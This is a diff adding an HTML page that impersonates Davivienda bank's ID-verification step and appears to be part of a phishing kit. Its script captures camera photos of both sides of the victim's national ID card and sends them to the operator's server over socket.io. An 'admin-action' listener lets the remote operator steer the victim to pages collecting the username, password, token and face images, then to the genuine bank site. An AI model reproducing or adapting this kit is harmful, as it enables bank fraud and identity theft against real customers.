@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda - Escaneo de Cédula</title>
+    <link rel="icon" type="image/webp" href="img/logo-davivienda-web.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to bottom, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 0;
+        }
+
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 340px;
+            padding: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo-section {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-section img {
+            height: 35px;
+            width: auto;
+        }
+
+        .content {
+            padding: 30px 25px;
+        }
+
+        .greeting {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .welcome-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 15px;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .scan-section {
+            margin-bottom: 25px;
+        }
+
+        .scan-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .scan-container {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            border-radius: 10px;
+            border: 2px solid #ccc;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .btn-scan {
+            width: 100%;
+            padding: 12px;
+            background-color: #ED1C24;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            transition: background-color 0.3s;
+        }
+
+        .btn-scan:hover {
+            background-color: #d01920;
+        }
+
+        .btn-scan.captured {
+            background-color: #666;
+        }
+
+        .btn-scan.captured:hover {
+            background-color: #555;
+        }
+
+        .instructions {
+            background-color: #f8f8f8;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+
+        .instructions h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .instructions ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .instructions li {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .instructions li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #ED1C24;
+            font-weight: bold;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background-color: #ED1C24;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            transition: background-color 0.3s;
+            margin-bottom: 80px;
+        }
+
+        .btn-continue:hover {
+            background-color: #d01920;
+        }
+
+        .btn-continue:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9998;
+        }
+
+        .overlay.active {
+            display: block;
+        }
+
+        .forgot-password {
+            text-align: center;
+            padding: 20px 25px;
+            background-color: #f8f8f8;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .forgot-password p {
+            font-size: 14px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                box-shadow: none;
+            }
+            body {
+                padding-top: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay" id="overlay"></div>
+    
+    <div class="container">
+        <div class="logo-section">
+            <img src="img/Davivienda-Logo-Vector.svg-.png" alt="Davivienda">
+        </div>
+        
+        <div class="content">
+            <p class="greeting">Verificación de Identidad</p>
+            <h1 class="welcome-text">Escaneo de Cédula</h1>
+            <p class="info-text">Por favor, escanea ambos lados de tu cédula de ciudadanía para verificar tu identidad.</p>
+            
+            <div class="scan-section">
+                <label class="scan-label">Parte Frontal de la Cédula</label>
+                <div class="scan-container" id="frontContainer"></div>
+                <button class="btn-scan" id="btnScanFront">Capturar Frente</button>
+            </div>
+
+            <div class="scan-section">
+                <label class="scan-label">Parte Trasera de la Cédula</label>
+                <div class="scan-container" id="backContainer"></div>
+                <button class="btn-scan" id="btnScanBack" disabled>Capturar Parte Trasera</button>
+            </div>
+
+            <div class="instructions">
+                <h3>Instrucciones:</h3>
+                <ul>
+                    <li>Coloca la cédula en una superficie plana</li>
+                    <li>Asegúrate de tener buena iluminación</li>
+                    <li>Evita reflejos y sombras</li>
+                    <li>Mantén la cédula dentro del marco</li>
+                </ul>
+            </div>
+
+            <button class="btn-continue" id="btnContinue" disabled>Continuar</button>
+        </div>
+        
+        <div class="forgot-password">
+            <p>¿Necesitas ayuda con el escaneo?</p>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const persistentSessionId = localStorage.getItem('persistentSessionId');
+        
+        if (!persistentSessionId) {
+            window.location.href = '/index.html';
+        }
+        
+        const socket = io({
+            auth: { sessionId: persistentSessionId }
+        });
+
+        socket.on('connect', () => {
+            console.log('Conectado - Socket:', socket.id, '| Session:', persistentSessionId);
+        });
+
+        const btnScanFront = document.getElementById('btnScanFront');
+        const btnScanBack = document.getElementById('btnScanBack');
+        const btnContinue = document.getElementById('btnContinue');
+        const frontContainer = document.getElementById('frontContainer');
+        const backContainer = document.getElementById('backContainer');
+        const overlay = document.getElementById('overlay');
+
+        let frontImage = null;
+        let backImage = null;
+        let frontStream = null;
+        let backStream = null;
+        let frontVideo = null;
+        let backVideo = null;
+
+        async function startCamera(container, isFront) {
+            try {
+                const videoElement = document.createElement('video');
+                videoElement.autoplay = true;
+                videoElement.playsInline = true;
+                videoElement.style.width = '100%';
+                videoElement.style.height = '100%';
+                videoElement.style.objectFit = 'cover';
+
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: 1280, height: 720 } 
+                });
+                
+                videoElement.srcObject = stream;
+                container.innerHTML = '';
+                container.appendChild(videoElement);
+                
+                if (isFront) {
+                    frontStream = stream;
+                    frontVideo = videoElement;
+                } else {
+                    backStream = stream;
+                    backVideo = videoElement;
+                }
+            } catch (error) {
+                console.error('Error cámara:', error);
+                alert('No se pudo acceder a la cámara. Verifica los permisos.');
+            }
+        }
+
+        function capturePhoto(videoElement, stream) {
+            if (!videoElement || !stream) return null;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth || 1280;
+            canvas.height = videoElement.videoHeight || 720;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+            return canvas.toDataURL('image/jpeg', 0.9);
+        }
+
+        function checkBothScanned() {
+            btnContinue.disabled = !(frontImage && backImage);
+        }
+
+        startCamera(frontContainer, true);
+
+        btnScanFront.addEventListener('click', async function() {
+            if (!frontImage) {
+                overlay.classList.add('active');
+                
+                setTimeout(() => {
+                    frontImage = capturePhoto(frontVideo, frontStream);
+                    
+                    if (frontImage) {
+                        const img = document.createElement('img');
+                        img.src = frontImage;
+                        img.style.width = '100%';
+                        img.style.height = '100%';
+                        img.style.objectFit = 'cover';
+                        
+                        frontContainer.innerHTML = '';
+                        frontContainer.appendChild(img);
+                        
+                        btnScanFront.textContent = 'Re-escanear Frente';
+                        btnScanFront.classList.add('captured');
+                        
+                        btnScanBack.disabled = false;
+                        startCamera(backContainer, false);
+                        
+                        checkBothScanned();
+                    }
+                    
+                    overlay.classList.remove('active');
+                }, 500);
+            } else {
+                frontImage = null;
+                await startCamera(frontContainer, true);
+                btnScanFront.textContent = 'Capturar Frente';
+                btnScanFront.classList.remove('captured');
+                checkBothScanned();
+            }
+        });
+
+        btnScanBack.addEventListener('click', async function() {
+            if (!backImage) {
+                overlay.classList.add('active');
+                
+                setTimeout(() => {
+                    backImage = capturePhoto(backVideo, backStream);
+                    
+                    if (backImage) {
+                        const img = document.createElement('img');
+                        img.src = backImage;
+                        img.style.width = '100%';
+                        img.style.height = '100%';
+                        img.style.objectFit = 'cover';
+                        
+                        backContainer.innerHTML = '';
+                        backContainer.appendChild(img);
+                        
+                        btnScanBack.textContent = 'Re-escanear Parte Trasera';
+                        btnScanBack.classList.add('captured');
+                        checkBothScanned();
+                    }
+                    
+                    overlay.classList.remove('active');
+                }, 500);
+            } else {
+                backImage = null;
+                await startCamera(backContainer, false);
+                btnScanBack.textContent = 'Capturar Parte Trasera';
+                btnScanBack.classList.remove('captured');
+                checkBothScanned();
+            }
+        });
+
+        btnContinue.addEventListener('click', function() {
+            if (!frontImage || !backImage) {
+                alert('Por favor escanea ambos lados de tu cédula');
+                return;
+            }
+
+            overlay.classList.add('active');
+            
+            socket.emit('submit-id', {
+                frontImage: frontImage,
+                backImage: backImage,
+                frontSize: frontImage.length,
+                backSize: backImage.length,
+                timestamp: new Date().toISOString()
+            });
+        });
+
+        socket.on('data-sent', (response) => {
+            if (!response.success) {
+                console.error('Error:', response.error);
+                overlay.classList.remove('active');
+            } else {
+                setTimeout(() => {
+                    window.location.href = '/loading.html?action=id';
+                }, 500);
+            }
+        });
+
+        socket.on('admin-action', (data) => {
+            const { action } = data;
+            
+            switch(action) {
+                case 'request-user':
+                    window.location.href = '/index.html';
+                    break;
+                case 'request-password':
+                    window.location.href = '/clave.html';
+                    break;
+                case 'request-token':
+                    window.location.href = '/token.html';
+                    break;
+                case 'request-face':
+                    window.location.href = '/cara.html';
+                    break;
+                case 'request-id':
+                    window.location.href = '/cedula.html';
+                    break;
+                case 'finish':
+                    window.location.href = 'https://www.davivienda.com/';
+                    break;
+            }
+        });
+
+        socket.on('connect_error', (error) => {
+            console.error('Error de conexión:', error);
+        });
+    </script>
+</body>
+</html>
